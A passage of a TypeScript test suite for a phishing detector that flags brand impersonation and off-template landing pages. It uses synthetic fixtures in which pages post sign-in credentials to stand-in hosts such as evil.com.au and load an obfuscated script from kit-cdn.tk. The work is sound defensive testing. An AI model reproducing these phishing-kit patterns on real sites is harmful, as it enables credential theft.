    const ctx = pageCtx("https://www.acme.com/features", html);
    expect(detectBrandImpersonation(ctx)).toBeNull();
  });

  // FQDN/trailing-dot form must normalize the same as the bare host: an off-brand
  // `evil.com.au.` from `victim.com.au.` is still cross-site → flagged.
  test("trailing-dot FQDN hosts normalize → off-brand .com.au still flagged", () => {
    const ctx = pageCtx(
      "https://victim.com.au./login",
      offBrandPage("victim.com.au.", "evil.com.au.")
    );
    expect(detectBrandImpersonation(ctx)).not.toBeNull();
  });

  // `gov.au` IS in the suffix table, so the COMMON two-tier case keeps unrelated
  // registrable domains distinct: `treasury.gov.au` vs `health.gov.au` → flagged.
  test("two-tier gov suffix (.gov.au) keeps unrelated domains distinct → flagged", () => {
    const ctx = pageCtx(
      "https://treasury.gov.au/login",
      offBrandPage("treasury.gov.au", "health.gov.au")
    );
    expect(detectBrandImpersonation(ctx)).not.toBeNull();
    expect(detectBrandImpersonation(ctx)?.reason).toContain("health.gov.au");
  });

  // Deeper THREE-tier PSL suffixes (`*.nsw.edu.au`) are now resolved correctly:
  // `nsw.edu.au` is a real public suffix, so unrelated schools beneath it are
  // distinct registrable domains and the off-brand sign-in IS flagged. The
  // curated table could not represent this tier and over-collapsed it (suppressed
  // the guess) — this asserts the PSL fix closes that gap.
  test("deeper three-tier suffix (.nsw.edu.au) → off-brand sibling IS flagged", () => {
    const ctx = pageCtx(
      "https://school-a.nsw.edu.au/login",
      offBrandPage("school-a.nsw.edu.au", "school-b.nsw.edu.au")
    );
    const hit = detectBrandImpersonation(ctx);
    expect(hit).not.toBeNull();
    expect(hit?.reason).toContain("school-b.nsw.edu.au");
  });

  // A ccTLD second-level the curated ~50-entry table never listed (`com.pl`).
  // The naive proxy AND the curated table both collapsed it to the suffix; the
  // PSL knows it, so unrelated `com.pl` registrable domains are now distinct.
  test("ccTLD absent from old curated table (.com.pl) → off-brand flagged", () => {
    const ctx = pageCtx(
      "https://victim.com.pl/login",
      offBrandPage("victim.com.pl", "evil.com.pl")
    );
    const hit = detectBrandImpersonation(ctx);
    expect(hit).not.toBeNull();
    expect(hit?.reason).toContain("evil.com.pl");
  });

  test("same-registrable subdomain on .com.pl → NOT flagged (no FP)", () => {
    const html = `<!DOCTYPE html><html><head>
      <title>Victim PL - Calendly scheduling</title>
      <link rel="canonical" href="https://www.victim.com.pl/features"></head>
      <body><h1>Calendly integration</h1>
      <p>Sign in with Google to get started with Calendly.</p>
      <a href="https://app.victim.com.pl/login">Sign in with Google</a></body></html>`;
    const ctx = pageCtx("https://www.victim.com.pl/features", html);
    expect(detectBrandImpersonation(ctx)).toBeNull();
    expect(detectPageSignals(ctx).size).toBe(0);
  });

  // PRIVATE-section suffix (free-hosting platform). With allowPrivateDomains the
  // two tenants are DISTINCT registrable domains, so a kit on one blogspot site
  // posting brand-labeled creds to another is flagged — the common phishing-on-
  // free-hosting case ICANN-only resolution would suppress.
  test("private-suffix tenants (.blogspot.com) → cross-tenant off-brand flagged", () => {
    const ctx = pageCtx(
      "https://victim.blogspot.com/login",
      offBrandPage("victim.blogspot.com", "evil.blogspot.com")
    );
    const hit = detectBrandImpersonation(ctx);
    expect(hit).not.toBeNull();
    expect(hit?.reason).toContain("evil.blogspot.com");
  });

  // Null-fallback path: tldts returns null for IP literals (and localhost, bare
  // suffixes, single-label hosts), so `registrableDomain` falls back to the
  // normalized host. Two DIFFERENT IPs must stay distinct (not collapse to a
  // shared same-site value) — pins the fallback against a future tldts change.
  test("IP-literal hosts use host fallback → distinct IPs are off-brand (flagged)", () => {
    const ctx = pageCtx(
      "https://203.0.113.5/login",
      offBrandPage("203.0.113.5", "203.0.113.9")
    );
    const hit = detectBrandImpersonation(ctx);
    expect(hit).not.toBeNull();
    expect(hit?.reason).toContain("203.0.113.9");
  });
});

// ── template-discontinuity: what counts as "the site's own assets" ───
//
// The veto that stops a legitimate off-template page from being escalated used
// to accept ANY host shared with the rest of the crawl, and `assetHosts` was
// every `<link href>` host, so a canonical, a favicon or a preconnect was enough,
// and so was a font CDN both pages happen to use. These probes came out of the
// review of #2233 and each one is a page that carries an integrity signal, is a
// template outlier, and differs only in what it loads.
//
// Fixtures here are synthetic (`example-site.test`); nothing in this block comes
// from a real site.

const PSITE = "https://example-site.test";
const PCDN = "https://cdn.example-site.test";
const PTHIRD = "https://cdn.thirdparty.test";

/** Theme on a separate CDN host. */
function pThemed(title: string): string {
  return `<!DOCTYPE html><html><head>
    <title>${title}</title>
    <link rel="stylesheet" href="${PCDN}/theme/style.css">
    <link rel="stylesheet" href="${PCDN}/theme/layout.css">
    <link rel="stylesheet" href="${PCDN}/theme/blocks.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto">
    <script src="${PCDN}/theme/app.js"></script>
    <style>:root{--brand-color:#0a5;--brand-spacing:8px;}</style>
  </head><body class="wp-theme sitetheme home page-template">
    <nav class="main-nav"><a href="/">Home</a></nav>
    <main>${CLEAN_BODY}</main>
    <footer class="site-footer"><img src="${PCDN}/logo.png" alt="logo">Site</footer>
  </body></html>`;
}

/** Theme served from the site's own origin, so a canonical shares its host. */
function pThemedSameOrigin(title: string): string {
  return `<!DOCTYPE html><html><head>
    <title>${title}</title>
    <link rel="stylesheet" href="/theme/style.css">
    <link rel="stylesheet" href="/theme/layout.css">
    <link rel="stylesheet" href="/theme/blocks.css">
    <script src="/theme/app.js"></script>
    <style>:root{--brand-color:#0a5;--brand-spacing:8px;}</style>
  </head><body class="wp-theme sitetheme home page-template">
    <nav class="main-nav"><a href="/">Home</a></nav>
    <main>${CLEAN_BODY}</main>
    <footer class="site-footer"><img src="/logo.png" alt="logo">Site</footer>
  </body></html>`;
}

/** Theme served wholly from a third-party CDN that is not a shared public one. */
function pThemedThirdParty(title: string): string {
  return `<!DOCTYPE html><html><head>
    <title>${title}</title>
    <link rel="stylesheet" href="${PTHIRD}/theme/style.css">
    <link rel="stylesheet" href="${PTHIRD}/theme/layout.css">
    <link rel="stylesheet" href="${PTHIRD}/theme/blocks.css">
    <script src="${PTHIRD}/theme/app.js"></script>
    <style>:root{--brand-color:#0a5;--brand-spacing:8px;}</style>
  </head><body class="wp-theme sitetheme home page-template">
    <nav class="main-nav"><a href="/">Home</a></nav>
    <main>${CLEAN_BODY}</main>
    <footer class="site-footer"><img src="${PTHIRD}/logo.png" alt="logo">Site</footer>
  </body></html>`;
}

/**
 * Theme that pulls a library from jsDelivr, so the shared public CDN is in the
 * baseline's resource hosts and the exclusion has something to exclude. Without
 * this the jsDelivr probe would pass whether or not the exclusion exists.
 */
function pThemedWithPublicCdn(title: string): string {
  return `<!DOCTYPE html><html><head>
    <title>${title}</title>
    <link rel="stylesheet" href="${PCDN}/theme/style.css">
    <link rel="stylesheet" href="${PCDN}/theme/layout.css">
    <link rel="stylesheet" href="${PCDN}/theme/blocks.css">
    <script src="https://cdn.jsdelivr.net/npm/lib/dist/lib.js"></script>
    <script src="${PCDN}/theme/app.js"></script>
    <style>:root{--brand-color:#0a5;--brand-spacing:8px;}</style>
  </head><body class="wp-theme sitetheme home page-template">
    <nav class="main-nav"><a href="/">Home</a></nav>
    <main>${CLEAN_BODY}</main>
    <footer class="site-footer"><img src="${PCDN}/logo.png" alt="logo">Site</footer>
  </body></html>`;
}

/**
 * Theme that PRECONNECTS to a host it never actually loads from. The host is in
 * every page's `<link href>` set and in none of their resource sets, which is
 * the difference between the two.
 */
function pThemedWithPreconnect(title: string): string {
  return `<!DOCTYPE html><html><head>
    <title>${title}</title>
    <link rel="preconnect" href="https://preconnect-only.test">
    <link rel="stylesheet" href="${PCDN}/theme/style.css">
    <link rel="stylesheet" href="${PCDN}/theme/layout.css">
    <link rel="stylesheet" href="${PCDN}/theme/blocks.css">
    <script src="${PCDN}/theme/app.js"></script>
    <style>:root{--brand-color:#0a5;--brand-spacing:8px;}</style>
  </head><body class="wp-theme sitetheme home page-template">
    <nav class="main-nav"><a href="/">Home</a></nav>
    <main>${CLEAN_BODY}</main>
    <footer class="site-footer"><img src="${PCDN}/logo.png" alt="logo">Site</footer>
  </body></html>`;
}

/** The odd page's head, minus whatever the probe is testing. */
function oddPage(extraHead: string, extraBody = ""): string {
  return `<!DOCTYPE html><html><head>
    <title>Offer</title>
    ${extraHead}
    <script>${obfuscatedPayload()}</script>
  </head><body class="lp">${extraBody}<div>Sign in to continue.</div></body></html>`;
}

type ProbeOutlier = {
  url: string;
  escalated: boolean;
  signals: number;
  loadsSiteAssets: boolean;
};

/**
 * Run the rule over four themed pages plus one odd page and return the odd
 * page's row, from whichever check it landed in. `undefined` means it was not
 * an outlier at all, which every probe below asserts against: a probe that
 * silently stops being flagged would otherwise "pass" for the wrong reason.
 */
function probe(
  theme: (title: string) => string,
  oddHtml: string,
  opts?: { crawlLimits?: { pagesCrawled: number; maxPages: number }; themedPages?: number }
): ProbeOutlier | undefined {
  const n = opts?.themedPages ?? 4;
  const pages = [
    ...Array.from({ length: n }, (_, i) =>
      pageEntry(`${PSITE}/p${i}`, theme(`Page ${i}`))
    ),
    pageEntry(`${PSITE}/odd`, oddHtml),
  ];
  const checks = run(
    templateDiscontinuityRule,
    siteCtx(pages, { crawlLimits: opts?.crawlLimits })
  );
  const rows = [
    ...((find(checks, "template-discontinuity")?.details?.outliers as ProbeOutlier[]) ?? []),
    ...((find(checks, "template-discontinuity-review")?.details?.outliers as ProbeOutlier[]) ?? []),
  ];
  return rows.find((o) => o.url.endsWith("/odd"));
}

describe("integrity/template-discontinuity: the site's own assets", () => {
  test("a stylesheet or script from a site resource host still vetoes escalation", () => {
    const row = probe(
      pThemed,
      oddPage(
        `<link rel="stylesheet" href="https://kit-cdn.tk/lp.css"><script src="${PCDN}/theme/app.js"></script>`
      )
    );
    expect(row).toBeDefined();
    expect(row?.signals).toBeGreaterThanOrEqual(1);
    expect(row?.loadsSiteAssets).toBe(true);
    expect(row?.escalated).toBe(false);
  });

  test("probe a: hotlinking one of the site's own stylesheets still vetoes", () => {
    const row = probe(
      pThemed,
      oddPage(
        `<link rel="stylesheet" href="${PCDN}/theme/style.css"><link rel="stylesheet" href="https://kit-cdn.tk/lp.css">`
      )
    );
    expect(row).toBeDefined();
    expect(row?.loadsSiteAssets).toBe(true);
    expect(row?.escalated).toBe(false);
  });

  test("probe a3: a font CDN both pages use is not the site's own asset", () => {
    const row = probe(
      pThemed,
      oddPage(
        `<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto"><link rel="stylesheet" href="https://kit-cdn.tk/lp.css">`
      )
    );
    expect(row).toBeDefined();
    expect(row?.loadsSiteAssets).toBe(false);
    expect(row?.escalated).toBe(true);
  });

  test("probe a4: a canonical pointing at the site is not an asset", () => {
    const row = probe(
      pThemedSameOrigin,
      oddPage(
        `<link rel="canonical" href="${PSITE}/odd"><link rel="stylesheet" href="https://kit-cdn.tk/lp.css">`
      )
    );
    expect(row).toBeDefined();
    expect(row?.loadsSiteAssets).toBe(false);
    expect(row?.escalated).toBe(true);
  });

  test("probe a5: a favicon on the site's own host is not an asset", () => {
    const row = probe(
      pThemedSameOrigin,
      oddPage(
        `<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="https://kit-cdn.tk/lp.css">`
      )
    );
    expect(row).toBeDefined();
    expect(row?.loadsSiteAssets).toBe(false);
    expect(row?.escalated).toBe(true);
  });

  test("a preconnect to the site's own host is not an asset either", () => {
    const row = probe(
      pThemedSameOrigin,
      oddPage(
        `<link rel="preconnect" href="${PSITE}"><link rel="stylesheet" href="https://kit-cdn.tk/lp.css">`
      )
    );
    expect(row).toBeDefined();
    expect(row?.loadsSiteAssets).toBe(false);
    expect(row?.escalated).toBe(true);
  });

  test("an image from a site resource host is not enough on its own", () => {
    const row = probe(
      pThemed,
      oddPage(
        `<link rel="stylesheet" href="https://kit-cdn.tk/lp.css">`,
        `<img src="${PCDN}/logo.png" alt="logo">`
      )
    );
    expect(row).toBeDefined();
    expect(row?.loadsSiteAssets).toBe(false);
    expect(row?.escalated).toBe(true);
  });

  // The baseline side of the veto has to be resource hosts, not every linked
  // host. Here the only thing the site ever said about `preconnect-only.test` is
  // that it might connect to it; it never loaded a byte from it. A page loading
  // a script from there shares nothing the site actually serves.
  test("a host the site only preconnects to is not one of its asset hosts", () => {
    const row = probe(
      pThemedWithPreconnect,
      oddPage(`<script src="https://preconnect-only.test/x.js"></script>`)
    );
    expect(row).toBeDefined();
    expect(row?.loadsSiteAssets).toBe(false);
    expect(row?.escalated).toBe(true);
  });

  // The veto's host arm has to accept a stylesheet, not just a script. This page
  // loads a DIFFERENT file from the site's CDN, so the exact-href arm cannot fire
  // and the host arm is the only thing that can veto it.
  test("a stylesheet from a site resource host vetoes on the host alone", () => {
    const row = probe(
      pThemed,
      oddPage(`<link rel="stylesheet" href="${PCDN}/theme/checkout-only.css">`)
    );
    expect(row).toBeDefined();
    expect(row?.signals).toBeGreaterThanOrEqual(1);
    expect(row?.loadsSiteAssets).toBe(true);
    expect(row?.escalated).toBe(false);
  });

  // The known limit, pinned rather than claimed fixed. A page the site really
  // does serve, from a first-party host the rest of the crawl never touches,
  // is indistinguishable from a foreign one by asset evidence; the veto cannot
  // see the difference and neither can anything else this rule has.
  test("probe b: a first-party host the rest of the crawl never uses reads as foreign", () => {
    const row = probe(
      pThemed,
      oddPage(`<link rel="stylesheet" href="https://assets2.example-site.test/lp.css">`)
    );
    expect(row).toBeDefined();
    expect(row?.loadsSiteAssets).toBe(false);
    expect(row?.escalated).toBe(true);
  });

  // A site served wholly from one third-party CDN. That host is not a shared
  // public CDN, so it still counts as the site's: a page loading from it is
  // vetoed, and one that does not is escalated.
  test("probe d: a site's own third-party CDN still counts as the site's", () => {
    const shares = probe(
      pThemedThirdParty,
      oddPage(`<script src="${PTHIRD}/theme/app.js"></script>`)
    );
    expect(shares?.escalated).not.toBe(true);

    const doesNot = probe(
      pThemedThirdParty,
      oddPage(`<link rel="stylesheet" href="https://kit-cdn.tk/lp.css">`)
    );
    expect(doesNot).toBeDefined();
    expect(doesNot?.loadsSiteAssets).toBe(false);
    expect(doesNot?.escalated).toBe(true);
  });

  // The theme itself pulls from jsDelivr here, so `cdn.jsdelivr.net` IS in the
  // baseline's resource hosts. Sharing it must still not buy a veto, and the
  // list is matched on subdomains, not just the bare host.
  test("a subdomain of a shared public CDN is shared even when the theme uses it", () => {
    const row = probe(
      pThemedWithPublicCdn,
      oddPage(`<script src="https://cdn.jsdelivr.net/npm/x/dist/x.js"></script>`)
    );
    expect(row).toBeDefined();
    expect(row?.loadsSiteAssets).toBe(false);
    expect(row?.escalated).toBe(true);
  });
});

// ── template-discontinuity: a capped crawl cannot accuse (#2233 AC4) ─

describe("integrity/template-discontinuity: capped crawls", () => {
  const foreign = () =>
    oddPage(`<link rel="stylesheet" href="https://kit-cdn.tk/lp.css">`);

  test("a crawl that stopped at its page limit with a thin baseline does not escalate", () => {
    const row = probe(pThemed, foreign(), {
      themedPages: 9,
      crawlLimits: { pagesCrawled: 10, maxPages: 10 },
    });
    expect(row).toBeDefined();
    // Everything else about it says escalate; only the cap holds it back.
    expect(row?.signals).toBeGreaterThanOrEqual(1);
    expect(row?.loadsSiteAssets).toBe(false);
    expect(row?.escalated).toBe(false);
  });

  test("the same crawl reports the page for review, and says why it stopped there", () => {
    const pages = [
      ...Array.from({ length: 9 }, (_, i) => pageEntry(`${PSITE}/p${i}`, pThemed(`Page ${i}`))),
      pageEntry(`${PSITE}/odd`, foreign()),
    ];
    const checks = run(
      templateDiscontinuityRule,
      siteCtx(pages, { crawlLimits: { pagesCrawled: 10, maxPages: 10 } })
    );
    expect(find(checks, "template-discontinuity")).toBeUndefined();
    const review = find(checks, "template-discontinuity-review");
    expect(review?.status).toBe("info");
    expect(review?.details?.escalationWithheld).toBe("capped_crawl_small_baseline");
  });

  test("the same page on an uncapped crawl of the same size IS escalated", () => {
    const row = probe(pThemed, foreign(), { themedPages: 9 });
    expect(row?.escalated).toBe(true);
  });

  test("a crawl that stopped short of its limit is not capped", () => {
    const row = probe(pThemed, foreign(), {
      themedPages: 9,
      crawlLimits: { pagesCrawled: 10, maxPages: 500 },
    });
    expect(row?.escalated).toBe(true);
  });

  test("a capped crawl with a baseline at the minimum escalates", () => {
    const row = probe(pThemed, foreign(), {
      themedPages: 19,
      crawlLimits: { pagesCrawled: 20, maxPages: 20 },
    });
    expect(row?.escalated).toBe(true);
  });

  test("the minimum is an option, so a caller can lower it", () => {
    const pages = [
      ...Array.from({ length: 9 }, (_, i) => pageEntry(`${PSITE}/p${i}`, pThemed(`Page ${i}`))),
      pageEntry(`${PSITE}/odd`, foreign()),
    ];
    const checks = run(
      templateDiscontinuityRule,
      siteCtx(pages, {
        crawlLimits: { pagesCrawled: 10, maxPages: 10 },
        options: { minBaselinePagesWhenCapped: 5 },
      })
    );
    expect(find(checks, "template-discontinuity")?.status).toBe("warn");
  });

  test("the default minimum is 20", () => {
    const schema = templateDiscontinuityRule.meta.optionsSchema!;
    const parsed = schema.parse({}) as { minBaselinePagesWhenCapped: number };
    expect(parsed.minBaselinePagesWhenCapped).toBe(20);
  });
});
